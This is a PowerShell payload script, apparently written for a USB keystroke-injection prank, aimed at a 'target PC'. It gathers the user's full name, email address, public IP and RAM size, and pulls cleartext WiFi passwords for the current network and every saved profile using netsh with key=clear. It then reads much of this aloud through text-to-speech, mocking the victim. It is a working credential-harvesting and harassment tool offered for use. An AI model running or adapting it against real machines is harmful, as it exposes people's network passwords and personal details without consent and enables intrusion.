<#
.NOTES
    This script gathers details from the target PC, including OS, RAM, Public IP, and email.
    It also retrieves SSID and WiFi passwords, checks the last password change, and comments on the security.
    It pauses until mouse movement is detected, then uses SAPI to provide feedback.
#>

$s = New-Object -ComObject SAPI.SpVoice

function Get-FullName {
    try {
        $fullName = (Net User $Env:username | Select-String -Pattern "Full Name").ToString().TrimStart("Full Name")
        return $fullName
    } catch {
        Write-Error "No name was detected"
        return $env:UserName
    }
}

function Get-RAM {
    try {
        $RAM = [int]((Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
        switch ($RAM) {
            { $_ -le 4 } { return "$RAM GB of RAM? Might as well use pen and paper" }
            { $_ -le 12 } { return "$RAM GB of RAM? I have a calculator with more power" }
            { $_ -le 24 } { return "$RAM GB of RAM? Probably a wannabe streamer setup" }
            default { return "$RAM GB of RAM? A supercomputer with no security, funny!" }
        }
    } catch {
        Write-Error "Error retrieving RAM info"
        return $null
    }
}

function Get-PubIP {
    try {
        return "Your public IP address is $(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content"
    } catch {
        Write-Error "No Public IP detected"
        return $null
    }
}

function Get-Pass {
    try {
        $pro = (netsh wlan show interface | Select-String -Pattern 'SSID').ToString().Split(':')[1].Trim()
        $pass = (netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content').ToString().Split(':')[1].Trim()
        $pwl = $pass.Length
        if ($pwl -lt 8) { return "$pro is not very creative. Password only $pwl characters? Really?" }
        elseif ($pwl -lt 12) { return "$pro is not very creative. Password $pwl characters long, still trash." }
        else { return "$pro is not a total fool. $pwl character password is decent but didn't stop me!" }
    } catch {
        Write-Error "No network detected"
        return $null
    }
}

function Get-Networks {
    $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress } |
        Select-Object Index, Description, IPAddress, DefaultIPGateway, MACAddress
    $WLANProfileNames = netsh wlan show profiles | Select-String -Pattern " : " | ForEach-Object {
        $_.ToString().Split(":")[1].Trim()
    }
    $WLANProfileObjects = @()
    foreach ($WLANProfileName in $WLANProfileNames) {
        try {
            $WLANProfilePassword = (netsh wlan show profile name="$WLANProfileName" key=clear | Select-String -Pattern "Key Content").ToString().Split(":")[1].Trim()
        } catch {
            $WLANProfilePassword = "No password stored"
        }
        $WLANProfileObject = [PSCustomObject]@{
            ProfileName = $WLANProfileName
            ProfilePassword = $WLANProfilePassword
        }
        $WLANProfileObjects += $WLANProfileObject
    }
    return $WLANProfileObjects
}

function Get-Days_Set {
    try {
        $pls = (net user $env:UserName | Select-String -Pattern "Password last").ToString().Split("e")[1].Trim()
        $days = [int](((Get-Date) - (Get-Date $pls)).Days)
        switch ($days) {
            { $_ -lt 45 } { return "$pls was the last time you changed your password. Changed $days days ago, at least you do it often." }
            { $_ -lt 182 } { return "$pls was the last time you changed your password. $days days ago, pushing it a bit." }
            default { return "$pls was the last time you changed your password. $days days ago, you were practically begging me to hack you." }
        }
    } catch {
        Write-Error "Password set date not found"
        return $null
    }
}

function Get-Email {
    try {
        $email = (GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches).ToString().Trim()
        switch -Wildcard ($email) {
            "*gmail*" { return "At least you use Gmail. Should we be friends? Email me at $email" }
            "*yahoo*" { return "A Yahoo account? You must be in your 50s or just out of prison. $email, this is sad." }
            "*hotmail*" { return "Hotmail? $email? Sending this to the FBI to check your hard drive." }
            default { return "I don't even know what this is. $email, hope you didn't think it was safe." }
        }
    } catch {
        Write-Error "Email not found"
        return "No email connected to your account, would've had more fun with it."
    }
}

# Gathering and speaking the collected information
$fullName = Get-FullName
$intro = "$fullName, here's a quick overview of your PC."
$ram = Get-RAM
$pubIP = Get-PubIP
$pass = Get-Pass
$lastPasswordChange = Get-Days_Set
$email = Get-Email
$networks = Get-Networks

$info = @(
    "Your full name: $fullName",
    "RAM Info: $ram",
    "Public IP Address: $pubIP",
    "WiFi Password: $pass",
    "Last Password Change: $lastPasswordChange",
    "Email Info: $email"
)

$s.Speak($intro)
$s.Speak($info -join "`n")

# Check for mouse movement and pause
$originalMousePosition = [System.Windows.Forms.Cursor]::Position
do {
    Start-Sleep -Milliseconds 500
} while ([System.Windows.Forms.Cursor]::Position -eq $originalMousePosition)
